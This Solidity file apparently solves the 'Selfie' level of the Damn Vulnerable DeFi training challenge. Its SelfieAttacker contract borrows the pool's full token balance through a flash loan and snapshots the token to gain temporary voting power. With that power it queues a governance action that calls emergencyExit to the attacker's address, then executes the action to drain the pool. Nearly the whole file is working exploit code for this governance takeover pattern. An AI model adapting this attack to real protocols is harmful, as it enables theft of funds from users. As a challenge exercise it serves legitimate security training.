// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { SelfiePool } from "./SelfiePool.sol";
import { SimpleGovernance } from "./SimpleGovernance.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import { DamnValuableTokenSnapshot } from  "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "hardhat/console.sol";

contract SelfieAttacker{
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    DamnValuableTokenSnapshot token;
    uint256 actionId;
    address owner;

    constructor(address _selfiePool, address _simpleGovernance){
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        token = DamnValuableTokenSnapshot(address(selfiePool.token()));
        owner = msg.sender;
    }

    function startAttack() external{
        //start the flash loan
        token.snapshot();
        selfiePool.flashLoan(
            IERC3156FlashBorrower(address(this)), 
            address(token), 
            token.balanceOf(address(selfiePool)), 
            ""
        );
    }

    function onFlashLoan(address origin, address _token, uint256 _amount, uint256 fee, bytes calldata _data) external returns(bytes32) {
        //retrieved liquidity token amount
        //use to query governance action
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", owner);
        token.snapshot();

        uint256 balance = token.getBalanceAtLastSnapshot(address(this));
        uint256 halfTotalSupply = token.getTotalSupplyAtLastSnapshot() / 2;
        uint256 _actionId = simpleGovernance.queueAction(address(selfiePool), 0, data);
        actionId = _actionId;

        //return the token
        token.approve(address(selfiePool), _amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function endAttack() external{
        //start the flash loan
        simpleGovernance.executeAction(actionId);
    }
}